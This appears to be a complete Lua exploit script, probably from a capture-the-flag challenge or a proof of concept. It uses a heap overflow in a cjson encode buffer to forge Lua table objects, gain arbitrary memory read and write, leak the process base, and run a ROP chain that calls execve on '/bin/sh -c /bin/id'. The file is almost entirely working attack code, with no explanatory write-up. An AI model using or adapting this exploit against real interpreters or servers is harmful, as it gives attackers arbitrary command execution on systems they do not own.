local n_expand = 5462
local n_spray = 0x10000
local string_overhead = 24 + 1 + 8 -- sizeof(TString): 24, NULL terminator: 1, malloc chunk overhead: 8

local LUA_TNIL      = 0
local LUA_TBOOLEAN  = 1
local LUA_TLIGHTUSERDATA = 2
local LUA_TNUMBER   =  3
local LUA_TSTRING   = 4
local LUA_TTABLE    = 5
local LUA_TFUNCTION =	6
local LUA_TUSERDATA =	7
local LUA_TTHREAD   = 8

local function exploit()
   ---------------
   -- Utilities --
   ---------------
   local function p64(val)
      -- 0xcafebabe --> "\xbe\xba\xfe\xca\x00\x00\x00\x00"
      local s = ""
      for i = 0, 7 do
         s = s .. string.char(val % 0x100)
         val = math.floor(val / 0x100)
      end
      return s
   end

   local function addrof(obj)
      local s = tostring(obj)
      if s:sub(1, 1) == "t" then
         -- "table: 0xdeadbeef" --> 0xdeadbeef
         return tonumber(s:sub(8, s:len()))
      else
         -- "function: 0xdeadbeef" --> 0xdeadbeef
         return tonumber(s:sub(11, s:len()))
      end
   end

   local function bytes_to_double(data)
      -- #data == 8
      return struct.unpack('d', data)
   end

   local function double_to_int(data)
      -- #data == 8
      return struct.unpack('L', struct.pack('d', data))
   end

   local function int_to_double(data)
      -- #data == 8
      return struct.unpack('d', struct.pack('L', data))
   end

   --
   -- Avoid GC
   --
   local refs = {}
   local refs_i = 1
   for i=1, 100000 do
      refs[i] = 0
   end

   --
   -- Make 0x40000000 bytes string
   --
   local b = ''
   local number_strings = {}
   for i=1,0x40000 do number_strings[i] = string.format("%08x", i) end
   b = table.concat(number_strings)
   for i=1, 2 do
      b = b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b .. b
   end

   local string_source = b;

   --
   -- Get the "low" address of heap
   --
   local heap_addr_leaker = {}
   local fake_array_base = addrof(heap_addr_leaker)
   -- error(("fake_array_base: %x"):format(fake_array_base))

   --
   -- Allocate an array used for AAR/AAW
   --
   local owow_array1 = nil
   local owow_array1_addr = nil
   for i=1, 100 do
      local _arr = {}
      local _addr = addrof(_arr)

      refs[refs_i] = _arr
      refs_i = refs_i + 1

      if _addr > fake_array_base then
         owow_array1 = _arr
         owow_array1_addr = _addr
         break
      end
   end
   if owow_array1 == nil then
      error("failed to allocate owow_array1 behind fake_array_base")
   end
   for i=1,10000 do
      owow_array1[i] = 0
   end
   -- error(("owow_array1_addr: %x"):format(owow_array1_addr))

   --
   -- Create a fake table object
   --
   local fake_table_template = (
      "SSSSSSSSFF" -- (pad for address 0xXXXXXX2'2')
      .. "\000\000\000\000\000\000\000\000" -- *next
      .. "\005" -- tt (LUA_TTABLE)
      .. "\001" -- marked
      .. "\000" -- flags
      .. "\000\000\000\000\000"
      .. "\000\000\000\000\000\000\000\000" -- _padding_ 
      .. "\000\000\000\000\000\000\000\000" -- *metatable
      .. p64(fake_array_base) -- *array --> low heap address
      .. "\000\000\000\000\000\000\000\000" -- *node
      .. "\000\000\000\000\000\000\000\000" -- *lastfree
      .. "\000\000\000\000\000\000\000\000" -- *gclist
      .. "\255\255\255\127\000\000\000\000" -- sizearray
   )
   if #fake_table_template ~= 82 then
      error(#fake_table_template)
      error("DO NOT CHANGE LENGTH")
   end

   -- This object will be used later for arbitrary addrof/fakeobj
   local leaker_array = {0, 0}
   -- error(("leaker_array: %s"):format(tostring(leaker_array)))

   collectgarbage()

   --
   -- Prepare heap expander
   --
   local heap_expand = {}
   for i = 1, n_expand do
      heap_expand[i] = 0
   end

   -- Prepare BOF payload
   --           ==[overflow]==>
   --           ----+-----------------+
   --               |  victim chunk   |
   --           ... |  size  |  data  |
   --           ----+-----------------+
   --  ow_offset    |-8      |0
   local ow = "1337exploit.1337"
   local ow_offset = -16
   local evil = string.sub(string_source, 1, n_expand * 0x10000 + 0x1ff90 + 0x4010 + ow_offset - 1) .. ow -- Note: '"' (1 byte) appended.
   if #evil * 6 < 0x80000000 then
      error("too short") 
   end
   -- error(("#evil: %d"):format(#evil))

   --
   -- Prepare fake table & victim table
   --
   local fakes_s = {}
   local fakes_t = {}
   local fakes_num = 100
   for i=1,fakes_num do
      fakes_s[i] = 0
      fakes_t[i] = 0
   end
   for i=1,fakes_num do
      fakes_s[i] = fake_table_template .. number_strings[i]
      fakes_t[i] = {}
   end

   local target_ptr = nil
   for i=fakes_num,1,-1 do
      -- 0xXXXX22 fake table
      -- 0xXXXX80 table
      -- Note: Difference of addresses depends on #fakes_s[i]. DO NOT change the length
      if tostring(fakes_t[i]):sub(-2) == "80" then
         target_ptr = fakes_t[i]
         break
      end
   end
   -- error(("target: %s"):format(tostring(target_ptr)))

   --
   -- Make these arrays later.
   --
   local spray_holder = {}
   for i=1,128 do
      spray_holder[i] = {}
   end
   -- error(("spray_holder: %s"):format(tostring(spray_holder)))

   --
   -- Flush allocator caches
   --
   for i=1,0x42 do
      for j=1,200 do -- To increase reliability, make more iterations.
         refs[refs_i] = string.sub(string_source, 8*(j-1)+1, 8*(j-1)+1 + math.max(0, i*0x10 - string_overhead) - 1)
         refs_i = refs_i + 1
      end
   end
   for i = 1, 256 do
      refs[refs_i] = { string_source:byte(1, 0x1000 - 1 - 5) }
      refs_i = refs_i + 1
   end

   --
   -- Allocate encode_buf from top. (actual chunk size: 0x1ff90)
   --
   cjson.encode_keep_buffer('on')

   local top = string.sub(string_source, 0, 0x4000 - string_overhead - 1)
   local result = cjson.encode(top) -- Note: this allocates 0x4010 bytes for return value.

   --
   -- Expand heap to avoid crash
   --
   for i = 1, n_expand do
      -- alloc chunk 0x10000
      -- heap_expand[i] = string.sub(string_source, 1 + 8*(i-1), 1 + 8*(i-1) + 0x10000 - string_overhead - 1)
      
      -- [ALT] alloc chunk 0x50 + 0xffb0
      heap_expand[i] = { string_source:byte(1, 0x1000 - 1 - 5) }
   end

   --- Now the objects align like the figure below hopefully
   --- +------------+----------------------+----------------+
   --- | encode_buf | ... garbage data ... | sprayed object |
   --- +------------+----------------------+----------------+
   for i=1,#spray_holder do
      spray_holder[i][1] = target_ptr
   end

   --
   -- Trigger vulnerability: Heap overflow on encode_buf
   --
   refs[refs_i] = cjson.encode(evil)
   refs_i = refs_i + 1

   --
   -- Find the modified object from sprayed objects
   --
   local fake_array = nil
   for i=1,#spray_holder do
      -- spray_holder[i][1][1] = 0x1337
      local obj = spray_holder[i][1]
      if tostring(obj):sub(-2) == "22" then
         fake_array = obj
         -- error(("found: %d"):format(i))
         break
      end
   end
   if fake_array == nil then
      error("Bad luck...")
   end

   --
   -- Make semi-AAW/AAR.
   --
   -- error(("Table of fake array: %s"):format(tostring(fake_array)))

   -- overwrite array
   local ofs = math.floor((owow_array1_addr + 0x20 - fake_array_base) / 0x10)
   -- error(("ofs: %d"):format(ofs))
   -- error(("data: %d"):format(struct.unpack('d', p64(fake_array_base - 8))))
   fake_array[1 + ofs] = struct.unpack('d', p64(fake_array_base - 8))

   -- overwrite array
   local ofs = math.floor((owow_array1_addr + 0x28 - (fake_array_base-8)) / 0x10)
   owow_array1[1 + ofs] = 0

   -- overwrite size
   local ofs = math.floor((owow_array1_addr + 0x40 - fake_array_base) / 0x10)
   fake_array[1 + ofs] = bytes_to_double("\255\255\255\127\000\000\000\000")

   local aaw0_base = fake_array_base - 8
   local aaw8_base = fake_array_base
   local aaw0_array = owow_array1
   local aaw8_array = fake_array
   -- error(("Table of fake array: %s"):format(tostring(fake_array)))

   local function semi_aaw(addr, value)
      -- Warning: This will write 0x03 (qword) tag at addr + 8.
      local ofs = math.floor((owow_array1_addr + 0x20 - fake_array_base) / 0x10)
      fake_array[1 + ofs] = struct.unpack('d', p64(addr))
      owow_array1[1] = value
   end

   local function semi_aar(addr)
      -- Warning: This requires 0x03 (qword) tag at addr + 8.
      local ofs = math.floor((owow_array1_addr + 0x20 - fake_array_base) / 0x10)
      fake_array[1 + ofs] = struct.unpack('d', p64(addr))
      return owow_array1[1]
   end
   -- error("[+] semi-AAR/AAW created.")

   --
   -- Leak *array of leaker_array
   --
   semi_aaw(addrof(leaker_array) + 0x28, int_to_double(3)) -- LUA_TNUMBER
   local leaker_array_array_addr = double_to_int(semi_aar(addrof(leaker_array) + 0x20)) -- leaker_array->array

   --
   -- addrof() for any object
   --
   local function addrof(obj)
      leaker_array[1] = obj
      semi_aaw(leaker_array_array_addr + 8, int_to_double(3))
      return double_to_int(semi_aar(leaker_array_array_addr))
   end

   local function fakeobj(addr, tt)
      semi_aaw(leaker_array_array_addr, int_to_double(addr))
      semi_aaw(leaker_array_array_addr + 8, int_to_double(tt))
      return leaker_array[1]
   end

   --
   -- Leak proc base
   --
   local addr_assert = addrof(assert)
   semi_aaw(addr_assert + 0x28, int_to_double(3))
   -- error("assert: " .. string.format("0x%x", addr_assert))

   local fake_array = (
      p64(0) .. p64(0x105)
      .. p64(0) .. p64(0)
      .. p64(addr_assert + 0x20) .. p64(0)
      .. p64(0) .. p64(0)
      .. p64(0x7fffffff)
   )
   local addr_fake_array = addrof(fake_array) + 0x18
   -- error("fake array: " .. string.format("0x%x", addr_fake_array))

   local fake_array = fakeobj(addr_fake_array, 5)
   local proc_base = double_to_int(fake_array[1]) - 0x175430 -- luaB_assert
   -- error("proc base: " .. string.format("0x%x", proc_base))

   --
   -- Prepare args
   --
   local args0 = "/bin/sh"
   local args1 = "-c"
   local args2 = "/bin/id"
   local args = (
      p64(addrof(args0) + 0x18)
      .. p64(addrof(args1) + 0x18)
      .. p64(addrof(args2) + 0x18)
      .. p64(0)
   )
   local addr_args = addrof(args) + 0x18
   local rdi = p64(addrof(args0) + 0x18) .. p64(addr_args)

   --
   -- Control RIP
   --
   local addr_execve = proc_base + 0x6a860
   local rop_mov_rdi_prax_call_praxP18h = proc_base + 0x1554c8
   local rop_xor_edx_edx_xor_esi_esi_mov_rdi_rbp_call_praxP38h = proc_base + 0xa7b55
   local rop_mov_rsi_prdiP8h_mov_rdi_prdi_call_praxP10h = proc_base + 0x12718b

   local fake_function = (
      p64(addrof(rdi) + 0x18) -- 00h
      .. p64(0x010106)
      .. p64(addr_execve) -- 10h (4)
      .. p64(rop_mov_rsi_prdiP8h_mov_rdi_prdi_call_praxP10h) -- 18h (3)
      .. p64(rop_xor_edx_edx_xor_esi_esi_mov_rdi_rbp_call_praxP38h) -- 20h (1)
      .. p64(0)
      .. p64(0)
      .. p64(rop_mov_rdi_prax_call_praxP18h) -- 38h (2)
   )
   local addr_fake_function = addrof(fake_function) + 0x18
   -- error("fake function: " .. string.format("0x%x", addr_fake_function))

   local fake_function = fakeobj(addr_fake_function, 6)
   fake_function()
end

exploit()

